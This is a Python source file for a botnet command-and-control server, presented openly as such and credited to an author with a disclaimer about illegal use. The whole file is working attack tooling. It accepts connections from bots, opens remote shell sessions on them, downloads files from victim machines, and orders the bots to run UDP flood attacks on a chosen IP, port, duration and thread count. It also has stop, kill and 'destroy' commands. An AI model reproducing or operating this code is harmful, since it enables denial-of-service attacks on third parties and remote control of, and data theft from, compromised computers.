from threading import Thread
from time import sleep, time
import ctypes, socket, sys
import platform, signal
from random import choice
from typing import Union, Tuple, List
from tempfile import NamedTemporaryFile
import os, inspect, hashlib

BACKLOG = 50
MAX_CHUNK_SIZE = 16 * 1024
VERSION = "BOTNET/2022.1"
PAYLOAD_SUFFIX = b'\x00\x00\xff\xff'

class Colours:
	def __init__(self):
		self.colours_fn = {}
		self.colours = []
		if platform.system() == 'Windows':
			kernel32 = ctypes.windll.kernel32
			kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
		COMMANDS = {
			# Lables
			'info': (33, '[!] '),
			'que': (34, '[?] '),
			'bad': (31, '[-] '),
			'good': (32, '[+] '),
			'run': (97, '[~] '),
			# Colors
			'green': 32,
			'lgreen': 92,
			'lightgreen': 92,
			'grey': 37,
			'red': 31,
			'lred': 91,
			'lightred': 91,
			'cyan': 36,
			'lcyan': 96,
			'lightcyan': 96,
			'blue': 34,
			'lblue': 94,
			'lightblue': 94,
			'purple': 35,
			'yellow': 93,
			'white': 97,
			'lpurple': 95,
			'lightpurple': 95,
			'orange': 33,
			# Styles
			'bg': ';7',
			'bold': ';1',
			'italic': '3',
			'under': '4',
			'strike': '09',
		}


		for key, val in COMMANDS.items():
			value = val[0] if isinstance(val, tuple) else val
			prefix = val[1] if isinstance(val, tuple) else ''

			if isinstance(val, int):
				self.colours.append(key)
				self.colours_fn[key] = lambda s, prefix=prefix, key=value: self._gen(s, prefix, key)

	def _gen(self,string, prefix, key):
		colored = prefix if prefix else string
		not_colored = string if prefix else ''
		result = '\033[{}m{}\033[0m{}'.format(key, colored, not_colored)
		return result
	
	def cprint(self, string:str):
		print(choice(list(self.colours_fn.values()))(string))

class Status:
	OK = "OK"
	FAIL = "FAIL"

class ContentType:
	file = "FILE"
	bytes = "BYTES"
	text = "TEXT"

class Request:
	def __init__(self, cmd:str, direct:bool=False, body:dict=dict(), header:dict=dict()):
		self.header = {"version": VERSION, "method": "CONNECT" if direct else "DIRECT", **header}
		self.body = {"ack": True, "cmd": cmd, **body}
	
	def __str__(self) -> str:
		return f"Request(header={self.header}, body={self.body})"
	
	def __repr__(self) -> str:
		return str(self)

	def set_header(self, key:str, value:str):
		self.header[key] = value

	def set_body(self, key:str, value:str):
		self.body[key] = value
	
	def get_payload(self, encoding:str="utf-8") -> bytes:
		return (
			"\r\n".join(f"{key}: {value}" for key, value in self.header.items())
			+ "\r\n\r\n"
			+ "\r\n".join(f"{key}: {value}" for key, value in self.body.items())
		).encode(encoding)


class NetworkFile:
	def __init__(self, mode:str="w+b"):
		self._fp = NamedTemporaryFile(mode=mode, delete=False)

	def write(self, chunk:Union[bytes, str]):
		self._fp.write(chunk)

	def read(self, chunk_size:int=MAX_CHUNK_SIZE):
		return self._fp.read(chunk_size)

	def seek(self, pos:int=0):
		self._fp.seek(pos)

	def close(self):
		self._fp.close()
		os.unlink(self._fp.name)
	
	def __str__(self):
		return f"NetworkFile<name={self._fp.name}>"

	def __del__(self):
		self.close()

class Response:
	def __init__(self, payload:bytes) -> None:
		self.raw_header, self.raw_body = payload.split(b"\r\n\r\n")
		self.header = {}
		self.body = {}

		for row in self.raw_header.decode().split("\r\n"):
			row_split_list = list(map(lambda x: x.strip(), row.split(":")))
			self.header[row_split_list[0]] = ":".join(row_split_list[1:]) or None

		self._rdata = ""

		self.ct = self.header.get("ct") # Content-Type
		if self.ct == ContentType.file:
			self.file = NetworkFile()

		self.process_body()

	@property
	def rdata(self):
		return self._rdata
	
	@property
	def err(self):
		return self.header.get("error")
	
	@property
	def output(self):
		return self.body.get("output") # Return output from command
	
	@property
	def raw(self):
		return self.raw_body

	def add_body(self, chunk:bytes):
		if self.ct == ContentType.file:
			self.raw_body = chunk
		else:
			self.raw_body += chunk

		self.process_body()
	
	def process_body(self):
		if self.ct == ContentType.file:
			self.file.write(self.raw_body)
			
		if self.ct == ContentType.text:
			for row in self.raw_body.decode().split("\r\n"):
				row_split_list = list(map(lambda x: x.strip(), row.split(":")))
				self.body[row_split_list[0]] = ":".join(row_split_list[1:]) or None
	def __str__(self):
		return f"Request<header={self.header}, body={self.body}>"
	
	def __repr__(self) -> str:
		return str(self)


class Session:
	def __init__(self, parent, conn:socket.socket):
		self.parent = parent
		self.conn = conn
		self.addr = conn.getpeername()
		self._buffer = b""
		host, port = self.addr
		self.input_title = f"client@{host}:~$ "

		self.cmds = cmds = {}
		for attr, func in inspect.getmembers(self):
			if attr.startswith("cmd_"):
				cmds[attr[4:].upper()] = func

		self.take_input()

	def take_input(self):
		while True:
			data = input(self.input_title).strip()
			if not data:
				continue
			
			if data == "exit":
				break

			data = data.split(" ")
			cmd = data[0].upper()
			params = data[1:]

			if cmd:=self.cmds.get(cmd):
				cmd(*params)
				continue

			self.cmd_shell(*data)
	
	def cmd_shell(self, *params):
		self.send(Request(cmd="SHELL", body={"params": ' '.join(params)}, direct=True))
		resp  = self.recv()
		print(resp.raw.decode())
	
	def cmd_help(self):
		help = [
			"<command> : shell command to client",
			"download <file>: Download file from client",
			"exit: Exit from client",
		]
		print("----Command List----")
		for h in help:
			command, description = h.split(" - ")
			print("\t" + f"{command:<40} - {description}")

	def cmd_download(self, file:str):
		self.send(Request(cmd="DOWNLOAD", body={"params": file}, direct=True))
		resp  = self.recv()

		if resp.header.get("status") == Status.OK:
			size = 0
			resp.file.seek()
			with open("1" + file, "wb") as fp:
				while chunk:=resp.file.read(MAX_CHUNK_SIZE):
					size += len(chunk)
					fp.write(chunk)

			print(f"Downloaded file {file}, {size}")

		elif resp.header.get("status") == Status.FAIL:
			print(resp.err)


	# utils
	def send(self, req:Request):
		self.conn.send(req.get_payload())
	
	def recv(self) -> Response:
		conn = self.conn
		conn.setblocking(1)

		data = conn.recv(MAX_CHUNK_SIZE)
		res = Response(data)

		while data:=conn.recv(MAX_CHUNK_SIZE):
			if data.endswith(PAYLOAD_SUFFIX):
				res.add_body(data[:-len(PAYLOAD_SUFFIX)])
				break
			res.add_body(data)
		
		res.conn = conn
		conn.setblocking(0)
		return res



class Server(Colours):
	def __init__(self, connect:Tuple[str,int]=("0.0.0.0",8080), auth:str=""):
		super().__init__()
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)

		self.connections = []
		self.tasks = {}

		self.stop = False
		self.connect = connect
		self.auth = auth
		
		self.sock = self.create_connection(self.connect)

		Thread(target=self.accept_connections).start()

		self.cmds = cmds = {}

		for attr, func in inspect.getmembers(self):
			if attr.startswith('cmd_'):
				cmds[attr[4:].upper()] = func
		
		self.print_logo()
		self.take_input()

	
	def exit_gracefully(self,signum:Union[str,object]="", frame:Union[str,object]=""):
		print("\nExiting....")
		self.stop = True
		self.sock.close()
		sleep(1)
		sys.exit(0)
	
	def create_connection(self, connect:Tuple[str,int]) -> bool:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.bind(connect)
		sock.listen(BACKLOG)
		sock.settimeout(0.5)
	
		return sock
	
	def accept_connections(self):
		while not self.stop:
			try:
				conn, address = self.sock.accept()
				conn.setblocking(0)
				self.connections.append(conn)
			except socket.timeout:
				continue
			except socket.error:
				continue
			except Exception as e:
				print("Error accepting connections")

	def _is_socket_closed(self, sock: socket.socket) -> bool:
		try:
			# this will try to read bytes without blocking and also without removing them from buffer (peek only)
			buf = sock.recv(1, socket.MSG_PEEK)
			if buf == b'':
				return True
		except BlockingIOError:
			return False  # socket is open and reading from it would block
		except ConnectionResetError:
			return True  # socket was closed for some other reason
		except Exception as e:
			return False
		return False
	
	def is_socket_closed(self, sock: socket.socket) -> bool:
		if self._is_socket_closed(sock):
			self.connections.remove(sock)
			return True
		return False
	
	def get_connection(self) -> socket.socket:
		count = 0
		closed = []
		for conn in [*self.connections]:
			is_closed = self.is_socket_closed(conn)
			if is_closed:
				continue
			count += 1
			yield count, conn
		

	def take_input(self):
		while True:
			data = input("Botnet@server:~$ ").strip()
			if not data:
				continue
			
			if data == "exit":
				self.exit_gracefully()

			data = data.split(" ")
			cmd = data[0].upper()
			params = data[1:]

			if cmd:=self.cmds.get(cmd):
				try:
					cmd(*params)
				except Exception as e:
					print(e)
				continue

			print("Invalid command")

	# Commands
	def cmd_ping(self):
		self.send(Request(cmd="PING"))
		self.display_output()

	def cmd_connect(self, conn_id:int):
		conn_id = int(conn_id)
		if len(self.connections) < conn_id:
			print("Invalid connection id")
			return
		
		conn = self.connections[conn_id-1]

		session = Session(self, conn)

	def cmd_attack(self, *params:List[str]):
		if len(params) != 4:
			print("Invalid params")
			return
		hash = self.get_hash("ATTACK", params)
		self.send(Request(cmd="ATTACK", body=dict(params=' '.join(params))))

		self.tasks[hash] = {
			"cmd": "ATTACK",
			"params": params,
			"time": time(),
		}

		self.display_output()

	def cmd_list(self):
		if len(self.connections) == 0:
			print("No clients connected")
			return

		print("----Clients----")
		for i, conn in self.get_connection():
			ip, port = conn.getpeername()
			self.cprint(f"{[i]}    {ip}:{port}    CONNECTED")
	
	def cmd_reset(self):
		for i, conn in self.get_connection():
			self.connections.remove(conn)
			conn.close()

	def cmd_help(self):
		help = [
			"list - list all connected clients",
			"ping - ping all clients",
			"connect <client_id> - connect to a client",
			"attack <ip> <port> <duration> <threads> - UDP flood attack on target",
			"tasklist - list all running tasks",
			"kill <task_id> - kill a task",
			"killall - kill all tasks",
			"destroy - destroy all clients",
			"help - show this help message"
		]
		print("----Command List----")
		for h in help:
			command, description = h.split(" - ")
			print("\t" + f"{command:<40} - {description}")
	
	def cmd_tasklist(self):
		if len(self.tasks) == 0:
			print("No tasks running")
			return
		print("----Tasks----")
		for hash, task in self.tasks.copy().items():
			duration = task["params"][2]

			if (time() - task["time"]) > int(duration):
				del self.tasks[hash]
				continue

			print(f"\t{hash} - {task['cmd']} {' '.join(task['params'])}")
	
	def cmd_killall(self):
		self.send(Request(cmd="STOP"))
		self.display_output()
	
	def cmd_kill(self, hash:int):
		hash = int(hash)
		if hash not in self.tasks:
			print("Invalid task id")
			return
		del self.tasks[hash]
		self.send(Request(cmd="KILL", body=dict(params=hash)))
		self.display_output()
	
	def cmd_destroy(self):
		self.send(Request(cmd="DESTROY"))
		self.display_output()

	# Utils

	def display_output(self):
		responses = self.recv()
		for i, res in enumerate(responses, start=1):
			ip, port = res.conn.getpeername()
			self.cprint(f"{[i]}    {ip}:{port}    {res.output}")

	def recv(self, conn:socket.socket=None) -> Response:
		if conn is None:
			responses = []
			for i, conn in self.get_connection():
				responses.append(self.recv(conn))
			return responses
		
		conn.setblocking(1)

		data = conn.recv(MAX_CHUNK_SIZE)
		res = Response(data)

		while data:=conn.recv(MAX_CHUNK_SIZE):
			if data.endswith(PAYLOAD_SUFFIX):
				res.add_body(data[:-len(PAYLOAD_SUFFIX)])
				break
			res.add_body(data)
		
		res.conn = conn
		conn.setblocking(0)
		return res

	def send(self, data:Request):
		for i, conn in self.get_connection():
			conn.send(data.get_payload())

	def get_hash(self, *args):
		data = []
		if len(args) > 1:
			for n in args:
				if isinstance(n, str):
					data.append(n)

				if isinstance(n, (tuple, list, set)):
					data += [*list(n)]
		else:
			data = args

		he = hashlib.md5(str(data).encode()).hexdigest()
		return (int(he, 16) % (1<<32))

	def print_logo(self) -> None:
		x =b"\n\n\n                  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n                  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n                  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d \xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \n                  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \n                  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91        \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91        \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \n                  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d        \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d        \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d    \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d   \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d   \n                                                                                              \n                             Mayank Gupta  @ gitHub.com/MayankFawkes\n                      Note! : We don't Accept any responsibility for any illegal usage.\n"		
		for n in x.decode().split("\n"):
			self.cprint(n)
			sleep(0.1)

if __name__ == "__main__":
	server = Server()
